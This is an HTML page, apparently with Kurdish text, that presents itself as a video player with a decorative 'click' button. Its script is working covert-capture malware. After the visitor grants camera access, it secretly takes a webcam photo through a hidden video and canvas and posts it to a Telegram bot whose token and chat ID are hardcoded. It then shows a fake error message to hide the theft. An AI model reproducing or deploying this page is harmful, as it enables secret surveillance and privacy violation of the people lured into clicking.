<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <link href="https://fonts.googleapis.com/css2?family=Lalezar&family=Vazirmatn:wght@500&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #0a0a0a;
            /* باگراوەندی دیواری بەردینی ڕەش */
            background-image: 
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px),
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px);
            background-size: 58px 58px;
            background-position: 0px 2px, 4px 35px, 29px 31px, 34px 6px;
            text-align: center;
            overflow: hidden;
        }

        #main-container {
            /* شووشەی لێڵ و مۆدێرن */
            background: rgba(255, 255, 255, 0.02);
            padding: 60px 40px;
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
            width: 85%;
            max-width: 350px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }

        h2 {
            color: #ffffff;
            margin-bottom: 40px;
            font-size: 38px;
            font-family: 'Lalezar', system-ui; /* فۆنتی زۆر جوان و هونەری */
            letter-spacing: 2px;
            text-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }

        #startBtn {
            padding: 18px 35px;
            font-size: 22px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            /* دوگمەی شووشەیی */
            background: rgba(255, 255, 255, 0.07);
            color: #ffffff;
            cursor: pointer;
            font-family: 'Lalezar', system-ui;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        #startBtn:hover {
            background: rgba(255, 255, 255, 0.15);
            transform: translateY(-8px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        #startBtn:active {
            transform: scale(0.92);
        }

        #status {
            color: #888;
            margin-top: 25px;
            font-family: 'Vazirmatn', sans-serif;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="title">ئـــەزیــزن🩶</h2>
        <button id="startBtn">&lt;👈🏽کلیک کردن👉🏽&gt;</button>
        <div id="status"></div>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('title').innerText = "...چاوەڕێ بن";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('title').innerText = "هەڵەیەک ڕوویدا دووبارە بکەرەوە.";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('title').innerText = "تکایە ڕێگە بدە بە کامێراکە (Allow).";
            });
        });
    </script>
</body>
</html>
